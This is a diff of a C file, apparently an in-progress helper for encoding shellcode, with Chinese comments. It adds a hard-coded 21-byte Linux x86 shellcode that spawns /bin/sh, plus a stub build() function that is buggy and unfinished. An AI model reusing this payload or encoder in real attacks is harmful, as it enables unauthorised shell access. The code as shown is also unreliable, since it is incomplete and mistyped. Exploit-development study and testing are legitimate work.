@@ -1,5 +1,6 @@
-#include <stdlib.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 
 struct RESULT_BYTE {
 	int overflow; // 进位的个数
@@ -123,19 +124,27 @@ struct RESULT * search(int target){
 	return result;
 }
 
+char * build(char *shellcode){
+	int length = (strlen(shellcode) / 4 + 1) * 4;
+	printf("[RESULT_LENGTH] : %d", length);
+	char *result = malloc(length); // 假设 shellcode 已经去掉了 0 字节
+	return result;
+}
+
 int main(){
+	char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80"; // length = 21
+	char *result = build(&shellcode);
+
+		
+/*		
 	int target = 0x12345678;
 	printf("[Target] : 0x%x\n", target);
 	struct RESULT * result = search(target);
-	//int a = ;
-	//int b = ;
-	//int c = ;
-	// print
 	printf("[FOUND] : \n");
 	printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
 	printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
-	// free
 	free(result);
+*/
 }
 
 // 产生一个问题 :
